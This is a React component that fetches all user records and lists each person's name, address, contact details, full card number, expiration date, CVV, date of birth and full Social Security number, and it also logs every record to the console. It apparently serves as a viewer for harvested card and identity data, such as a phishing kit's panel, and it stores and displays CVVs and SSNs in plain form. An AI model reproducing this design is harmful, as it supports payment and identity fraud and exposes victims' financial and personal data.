import React from 'react';
import { useQuery } from "@tanstack/react-query";
import useAxiosSecure from "../../../../hooks/useAxiosSecure";


const UsersInfo = () => {
    const axiosSecure = useAxiosSecure();
    const { data: users = [], refetch } = useQuery({
        queryKey: ['users'],
        queryFn: async () => {
            const res = await axiosSecure.get('/users');
            return res.data;
        }
    })

    console.log(users)

    return (
        <div>
            {
                users.map(user =>
                    <div className="collapse collapse-arrow join-item border bg-slate-50 border-base-300">
                        <input type="radio" name="my-accordion-1" />
                        <div className="collapse-title text-xl font-medium">
                            {user.first_name} {user.last_name}
                        </div>
                        <div className="collapse-content grid grid-cols-2 gap-4 bg-slate-400 text-black p-4">
                            <div className="">
                                <h2 className='text-center mb-3 underline'>Address Info</h2>
                                <div className="">
                                    <p>Address: {user.address}</p>
                                    <p>City: {user.city}</p>
                                    <p>State: {user.state}</p>
                                    <p>Zip: {user.zip}</p>
                                </div>
                                <div className="">
                                    <h2 className='text-center mb-3 underline'>Contact Info</h2>
                                    <div className="">
                                        <p>Phone: {user.phone}</p>
                                        <p>Email: {user.email}</p>
                                    </div>
                                </div>
                            </div>
                            <div className="">
                                <div className="">
                                    <h2 className='text-center mb-3 underline'>Card Info</h2>
                                    <div className="">
                                        <p>Card Number: {user.card_number}</p>
                                        <p>Expiration Date: {user.exdate}</p>
                                        <p>CVV: {user.cvc}</p>
                                    </div>
                                </div>
                                <div className="">
                                    <h2 className='text-center mb-3 underline'>Users Info</h2>
                                    <div className="">
                                        <p>First Name: {user.first_name}</p>
                                        <p>Last Name: {user.last_name}</p>
                                        <p>Date of Birth: {user.dob}</p>
                                        <p>Full SSN Number: {user.ssn_confirm}</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>)
            }
        </div>
    );
};

export default UsersInfo;